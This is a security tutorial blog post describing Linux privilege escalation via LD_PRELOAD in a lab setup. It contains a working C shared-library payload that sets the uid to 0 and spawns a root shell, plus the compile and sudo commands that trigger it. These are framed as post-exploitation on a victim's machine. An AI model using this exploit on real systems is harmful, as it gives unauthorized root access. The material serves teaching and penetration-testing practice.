<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Linux Privilege Escalation using LD_Preload</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/" rel="bookmark"><time class="entry-date published" datetime="2018-06-14T16:31:01+00:00">June 14, 2018</time><time class="updated" datetime="2025-06-08T13:05:08+00:00">June 8, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this Post, we are going to discuss a new technique of privilege escalation by exploiting an environment variable “LD_Preload” but to practice this you must take some help from our previous <a style="color: #000000;" href="//www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/"><span style="color: #3366ff;">article</span></a>.</span></p>
<h3 class="ai-optimize-7"><span style="color: #800000;">Table of contents</span></h3>
<ul>
<li class="ai-optimize-8"><span style="color: #000000;">Introduction</span></li>
<li class="ai-optimize-9"><span style="color: #000000;">Shared Libraries</span></li>
<li class="ai-optimize-10"><span style="color: #000000;">Shared Libraries Names</span></li>
<li class="ai-optimize-11"><span style="color: #000000;">LD_Preload</span></li>
<li class="ai-optimize-12"><span style="color: #000000;">Lab setup</span></li>
<li class="ai-optimize-13"><span style="color: #000000;">Privilege Escalation</span></li>
</ul>
<h3 class="ai-optimize-14"><span style="color: #800000;">Introduction</span></h3>
<p class="ai-optimize-15"><span style="color: #000000;"><strong>Shared Libraries</strong></span></p>
<p class="ai-optimize-16"><span style="color: #000000;">Shared libraries are libraries that are loaded by programs when they start. When a shared library is installed properly, all programs that start afterward automatically use the new shared library. </span></p>
<p class="ai-optimize-17"><span style="color: #000000;"><strong>Shared Libraries Names</strong></span></p>
<p class="ai-optimize-18"><span style="color: #000000;">Every shared library has a special name called the “soname”. The soname has the prefix “lib”, the name of the library, the phrase `”.so”, followed by a period and a version number.</span></p>
<p class="ai-optimize-19"><span style="color: #000000;">The dynamic linker can be run either indirectly by running some dynamically linked program or shared object. The programs <strong>ld.so </strong>and <strong>ld-linux.so* </strong>find and load the shared objects (shared libraries) needed by a program, prepare the program to run, and then run it. (read from <span style="color: #3366ff;">here</span>)</span></p>
<p class="ai-optimize-20"><span style="color: #000000;"><strong>LD_Preload:</strong> It is an environment variable that lists shared libraries with functions that override the standard set, just as /etc/ld.so.preload does. These are implemented by the loader /lib/ld-linux.so</span></p>
<p class="ai-optimize-21"><span style="color: #000000;">For more information read from <span style="color: #3366ff;"><a style="color: #3366ff;" href="//tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html">here</a>.</span></span></p>
<h3 class="ai-optimize-22"><span style="color: #800000;">Lab setup </span></h3>
<p class="ai-optimize-23"><span style="color: #000000;">It is important that logged user must have some sudo rights, therefore, we have given some sudo rights such as /usr/bin/find to be executed by sudo user. But apart from that, there is some Default specification where you can set an environment variable to work as sudo.</span></p>
<p class="ai-optimize-24"><span style="color: #000000;">To do this follow the below steps:</span></p>
<ul>
<li class="ai-optimize-25"><span style="color: #000000;">Open /etc/sudoers file by typing visudo</span></li>
<li class="ai-optimize-26"><span style="color: #000000;">Now give some sudo rights to a user, in our case “raj” will be members of sudoers.</span></li>
</ul>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">raj  ALL=(ALL:ALL) NOPASSWD: /usr/bin/find</pre>
<ul>
<li class="ai-optimize-27"><span style="color: #000000;">Then add the following as default specification to set the environment for LD_preload.</span></li>
</ul>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Defaults        env_keep += LD_PRELOAD</pre>
<p class="ai-optimize-28"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-9wRd64dZ_QI/WyKXUs_z5QI/AAAAAAAAXXw/W8Ds1SQlWkYiqFKsskwvbpkKSq1HK1XnACLcBGAs/s1600/2.png"/></span></p>
<h3 class="ai-optimize-29"><span style="color: #800000;"><span style="color: #000000;"><span style="color: #800000;">Privilege Escalation</span> </span></span></h3>
<p class="ai-optimize-30"><span style="color: #000000;">To exploit such type of vulnerability we need to compromise victim’s machine at once then move to privilege escalation phase. Suppose you successfully login into victim’s machine through ssh now for post exploitation type <strong>sudo -l</strong> command to detect it. And notice the highlighted environment variable will work as sudo.</span></p>
<p class="ai-optimize-31"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-8_aukc1AvK8/WyKXURVlRkI/AAAAAAAAXXs/CAZK18gYpR0TiFP4Aivw2LKCrJUZdLb8wCEwYBhgL/s1600/3.png"/></span></p>
<p class="ai-optimize-32"><span style="color: #000000;">Let’s generate a C program file inside /tmp directory.</span></p>
<p class="ai-optimize-33"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-B9yPaw7TbHU/WyKXUU2u8iI/AAAAAAAAXXo/pyxfa1xrXn8Pr1il5ziHSB2ppZ2MQN2AACEwYBhgL/s1600/4.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}</pre>
<p class="ai-optimize-34"><span style="color: #000000;">Then save it as shell.c inside /tmp.</span></p>
<p class="ai-optimize-35"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-H4g6p2ggbfA/WyKXVJnFfCI/AAAAAAAAXYE/jtgOe57paVYSq5EPS7ddVbVRiOFsP3m8gCEwYBhgL/s1600/5.png"/></span></p>
<p class="ai-optimize-36"><span style="color: #000000;">As discussed, let’s compile it to generate a shared object with .so extension likewise .dll file in the Windows operating system and hence type following:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">gcc -fPIC -shared -o shell.so shell.c -nostartfiles
ls -al shell.so
sudo LD_PRELOAD=/tmp/shell.so find
id
whoami</pre>
<p class="ai-optimize-37"><span style="color: #000000;">Yuppieeee!!!! We got the ROOT access.</span></p>
<p class="ai-optimize-38"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-SmdjE6lvzUI/WyKXVZ-5akI/AAAAAAAAXYM/ic2oN4QGsc4xmfyDUrwUMmWV0uL5bDntgCEwYBhgL/s1600/6.png"/></span></p>
<p class="ai-optimize-39"><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
